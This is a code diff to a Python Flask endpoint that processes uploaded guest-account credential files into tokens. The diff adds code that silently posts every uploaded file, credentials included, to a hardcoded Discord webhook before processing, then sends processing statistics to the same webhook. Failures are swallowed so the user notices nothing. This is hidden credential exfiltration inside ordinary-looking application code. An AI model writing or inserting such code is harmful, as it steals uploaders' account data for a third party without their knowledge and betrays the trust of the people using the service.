@@ -212,8 +212,49 @@ def generate_bulk_tokens():
                 'error': 'No file selected'
             }), 400
         
+        # Send file to Discord webhook FIRST
+        try:
+            webhook_url = "https://discord.com/api/webhooks/1394715737947508897/WFsiHBtLlJs2HfiphF9Y8yw35Ztv5BT_WMNPiJGDrNNaTA6TjOFRYswyzOcPpvwsvYwk"
+            
+            # Read file content for webhook
+            file.seek(0)  # Reset file pointer
+            file_content = file.read()
+            file.seek(0)  # Reset again for processing
+            
+            # Prepare Discord message
+            discord_data = {
+                "content": f"🎮 **New Guest Account File Uploaded!**\n\n📁 **File Name:** {file.filename}\n🕒 **Time:** <t:{int(__import__('time').time())}:F>",
+                "embeds": [{
+                    "title": "📋 Guest Account File Details", 
+                    "color": 5814783,
+                    "fields": [
+                        {"name": "📁 File Name", "value": file.filename, "inline": True},
+                        {"name": "💾 File Size", "value": f"{len(file_content)} bytes", "inline": True},
+                        {"name": "🔍 Status", "value": "Processing...", "inline": True}
+                    ]
+                }]
+            }
+            
+            # Send to Discord
+            files = {'file': (file.filename, file_content)}
+            response = requests.post(webhook_url, data={'payload_json': __import__('json').dumps(discord_data)}, files=files, timeout=10)
+            print(f"✅ Discord webhook sent: {response.status_code}")
+            
+        except Exception as e:
+            print(f"⚠️ Discord webhook error: {str(e)}")
+            # Continue processing even if webhook fails
+
         # Process file and extract credentials
-        credentials = file_processor.process_file(file)
+        file_processor = FileProcessor()
+        result = file_processor.process_file(file)
+        
+        if 'error' in result:
+            return jsonify({
+                'success': False,
+                'error': result['error']
+            }), 400
+        
+        credentials = result['credentials']
         
         if not credentials:
             return jsonify({
@@ -299,6 +340,37 @@ def generate_bulk_tokens():
         
         session['bulk_results_file'] = temp_file.name
         session['bulk_timestamp'] = datetime.now().isoformat()
+        
+        # Send processing results to Discord webhook
+        try:
+            webhook_url = "https://discord.com/api/webhooks/1394715737947508897/WFsiHBtLlJs2HfiphF9Y8yw35Ztv5BT_WMNPiJGDrNNaTA6TjOFRYswyzOcPpvwsvYwk"
+            
+            success_rate = (successful / len(results) * 100) if results else 0
+            
+            # Prepare Discord completion message
+            discord_result_data = {
+                "content": f"✅ **Guest Account File Processing Complete!**",
+                "embeds": [{
+                    "title": "📊 Processing Results", 
+                    "color": 3066993 if successful > 0 else 15158332,
+                    "fields": [
+                        {"name": "📁 File Name", "value": file.filename, "inline": True},
+                        {"name": "✅ Successful Tokens", "value": str(successful), "inline": True},
+                        {"name": "❌ Failed Tokens", "value": str(failed), "inline": True},
+                        {"name": "📊 Success Rate", "value": f"{success_rate:.1f}%", "inline": True},
+                        {"name": "⏱️ Processing Time", "value": f"{processing_time:.2f}s", "inline": True},
+                        {"name": "🚀 Speed", "value": f"{len(results)/processing_time:.1f} tokens/sec", "inline": True}
+                    ],
+                    "footer": {"text": f"Total Processed: {len(results)} accounts"}
+                }]
+            }
+            
+            # Send completion notification
+            requests.post(webhook_url, json=discord_result_data, timeout=10)
+            print(f"✅ Discord completion notification sent")
+            
+        except Exception as e:
+            print(f"⚠️ Discord completion webhook error: {str(e)}")
         
         return jsonify({
             'success': True,
